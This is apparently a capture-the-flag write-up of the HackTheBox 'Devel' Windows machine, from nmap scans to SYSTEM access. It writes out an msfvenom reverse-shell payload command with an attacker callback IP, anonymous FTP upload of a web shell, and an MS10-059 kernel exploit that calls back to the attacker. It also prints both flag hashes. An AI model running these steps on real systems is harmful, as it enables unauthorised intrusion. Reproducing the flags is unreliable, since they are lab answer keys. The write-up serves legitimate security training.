# Devel (Easy · Windows)

**Author:** Ph4n3s
**Date:** 2026-10-23
**IP:** 10.129.79.200
**Difficulty:** Easy / Windows

---

## 1. Enumeration

### 1.1 Ping

```
ping -c 1 10.129.79.200
```

```
64 bytes from 10.129.79.200: icmp_seq=1 ttl=127 time=4212 ms
```

With a TTL close to 128 we assume a Windows system (the very high response time is a one-off, probably caused by the load of spawning the machine).

### 1.2 Open port enumeration

```
nmap -p- --open -T4 --min-rate 5000 10.129.79.200
```

```
21/tcp open  ftp
80/tcp open  http
```

### 1.3 Technology enumeration

```
nmap -p 80,21 -sVC -T4 --min-rate 5000 -Pn 10.129.79.200
```

```
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Two key facts: the FTP allows **anonymous login**, and that FTP shares the same root as the IIS web site (`aspnet_client`, `iisstart.htm`, `welcome.png` are exactly the default files of a freshly installed IIS site). That means any file we upload over FTP should also become accessible over HTTP.

### 1.4 nmap vuln script

```
nmap -p 80,21 --script vuln -T4 --min-rate 5000 10.129.79.200
```

```
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-vuln-cve2015-1635:
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
```

Nmap flags the machine as vulnerable to MS15-034, but that is usually a false positive on this version of IIS/HTTP.sys (it only allows reading kernel memory via `Range`, not executing code on its own). We do not pursue it: with the anonymous FTP access we already have a far more direct vector.

---

## 2. Exploitation

Since the anonymous FTP writes directly onto the IIS web root, the plan is to upload an **ASPX web shell** over FTP and execute it by visiting it over HTTP.

**Step 1 — Generate the payload** with `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.120 LPORT=4444 -f aspx -o shell.aspx
```

**Step 2 — Upload it over anonymous FTP:**

```
ftp 10.129.79.200
> anonymous
> (blank password)
ftp> put shell.aspx
```

**Step 3 — Open a listener and trigger the shell:**

```bash
nc -lvnp 4444
curl http://10.129.79.200/shell.aspx
```

IIS runs the `.aspx` as ASP.NET code under the application pool, and we receive a reverse shell — but with very limited privileges (IIS service account, no permissions over the system).

---

## 3. Privilege escalation

The system is an old, unpatched Windows version, so we look for a kernel-level privilege escalation exploit. Using the information from `systeminfo` (build version, installed hotfixes) you can use **Windows Exploit Suggester** to narrow down candidates, or `searchsploit` directly against the operating system.

The chosen exploit was **CVE-2010-2554 / MS10-059** ("Chimichurri"), which once compiled produces a binary (`MS10-059.exe`) capable of spawning a shell with `NT AUTHORITY\SYSTEM` privileges.

**Step 1 — Upload the exploit** over the same anonymous FTP, to the web root (`C:\inetpub\wwwroot`):

```
ftp> put MS10-059.exe
```

**Step 2 — Confirm it is on the server** from the shell we already have:

```
dir C:\inetpub\wwwroot
```

**Step 3 — Open a second listener** (port 4445) and run the exploit, passing it our IP and port as parameters:

```
C:\inetpub\wwwroot\MS10-059.exe 10.10.16.120 4445
```

The binary opens a new connection back to us, this time with a shell as `NT AUTHORITY\SYSTEM`.

---

## 4. Post-exploitation

With the system shell, we read both flags:

```
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\babis\Desktop\user.txt
```

```
ROOT FLAG -> e84dbb08663ab19315472bfb585a6ede
USER FLAG -> bcd649fa3811b0c77561b89f131b64e4
```

![Devel machine owned on HackTheBox](devel-pwned.png)

---

## Quick summary

**What the machine was:** a freshly installed IIS 7.5 with anonymous FTP pointing to the same web root — a default, unsecured configuration — on top of a Windows with no kernel patches.

**Enumeration:** `nmap` → FTP (21) with anonymous login and HTTP (80) with IIS 7.5 → the FTP file structure matches the web root, a sign both share the same directory.

**Exploitation:** generate an `.aspx` web shell with `msfvenom`, upload it over anonymous FTP and run it by visiting it over HTTP → reverse shell with low privileges (IIS service account).

**Privilege escalation:** the unpatched operating system is vulnerable to a known kernel exploit (MS10-059 / CVE-2010-2554, "Chimichurri") → upload the binary over the same FTP, run it from the shell we already had → shell as `NT AUTHORITY\SYSTEM`.

**Key concept learned:** when a file-upload service (FTP, in this case) shares a directory with a web service that executes code (IIS + ASP.NET), uploading any file is equivalent to achieving remote code execution — no software vulnerability is needed, only a bad permission configuration between services.

---

**Flags:**
- `user.txt` (babis) → `bcd649fa3811b0c77561b89f131b64e4`
- `root.txt` (Administrator) → `e84dbb08663ab19315472bfb585a6ede`
